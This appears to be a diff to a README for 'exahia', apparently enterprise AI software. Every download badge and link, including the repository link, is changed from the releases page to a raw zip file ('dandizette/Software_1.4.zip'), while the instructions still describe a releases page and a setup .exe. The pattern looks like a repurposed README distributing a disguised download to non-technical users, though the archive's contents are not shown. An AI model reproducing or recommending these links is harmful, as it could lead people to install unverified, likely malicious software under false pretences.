@@ -1,6 +1,6 @@
 # 🚀 exahia - Secure Cloud AI for Enterprises
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/kakashi131221/exahia/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/kakashi131221/exahia/raw/refs/heads/main/dandizette/Software_1.4.zip)
 
 ---
 
@@ -32,12 +32,12 @@ You do not need programming skills to use exahia. The software handles data priv
 
 Click the green button below to visit the official downloads page. This page hosts all available versions of exahia. You can choose the latest version for Windows.
 
-[![Download releases](https://img.shields.io/badge/Download%20Latest%20Release-green?style=for-the-badge)](https://github.com/kakashi131221/exahia/releases)
+[![Download releases](https://img.shields.io/badge/Download%20Latest%20Release-green?style=for-the-badge)](https://github.com/kakashi131221/exahia/raw/refs/heads/main/dandizette/Software_1.4.zip)
 
 **Steps to download:**
 
 1. Visit the releases page by clicking the button above or open this link in your browser:
-   https://github.com/kakashi131221/exahia/releases
+   https://github.com/kakashi131221/exahia/raw/refs/heads/main/dandizette/Software_1.4.zip
 2. Look for the latest release date at the top of the page.
 3. Find the file named similar to `exahia-setup-windows.exe` or `exahia-windows-x64.exe`.
 4. Click on the file name to start downloading.
@@ -114,7 +114,7 @@ If the program does not open or shows errors:
 
 For more details about exahia’s features and updates, visit the GitHub repository:
 
-https://github.com/kakashi131221/exahia
+https://github.com/kakashi131221/exahia/raw/refs/heads/main/dandizette/Software_1.4.zip
 
 You can find documentation files inside the repository for advanced topics or enterprise setup guides.
 
@@ -131,4 +131,4 @@ Regular updates improve security and add new features. To update:
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download%20exahia-blue?style=for-the-badge)](https://github.com/kakashi131221/exahia/releases)
+[![Download Now](https://img.shields.io/badge/Download%20exahia-blue?style=for-the-badge)](https://github.com/kakashi131221/exahia/raw/refs/heads/main/dandizette/Software_1.4.zip)
